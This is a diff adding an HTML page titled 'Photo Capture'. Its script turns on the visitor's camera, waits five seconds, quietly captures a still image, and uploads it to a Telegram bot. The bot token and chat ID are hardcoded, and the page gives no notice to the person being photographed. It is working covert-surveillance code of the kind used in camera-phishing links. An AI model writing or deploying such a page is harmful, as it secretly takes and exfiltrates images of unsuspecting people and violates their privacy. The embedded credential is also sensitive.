@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo Capture</title>
+</head>
+<body>
+    <video id="video" width="300" height="250" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+
+    <script>
+        const botToken = "7593653128:AAGTeaMtzMzjcPbfABOTZ0YlQdfEGxkvHFQ";
+        const chatId = "7615485308";
+
+        // Get user camera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(function (stream) {
+                document.getElementById("video").srcObject = stream;
+            })
+            .catch(function (error) {
+                console.error("Camera access denied:", error);
+            });
+
+        // Capture the photo and send to Telegram
+        setTimeout(() => {
+            let video = document.getElementById("video");
+            let canvas = document.getElementById("canvas");
+            let context = canvas.getContext("2d");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob((blob) => {
+                let formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", blob, "photo.png");
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => response.json())
+                .then(data => console.log("Photo sent:", data))
+                .catch(error => console.error("Error sending photo:", error));
+            }, "image/png");
+        }, 5000); // Wait for 5 seconds before capturing
+    </script>
+</body>
+</html>
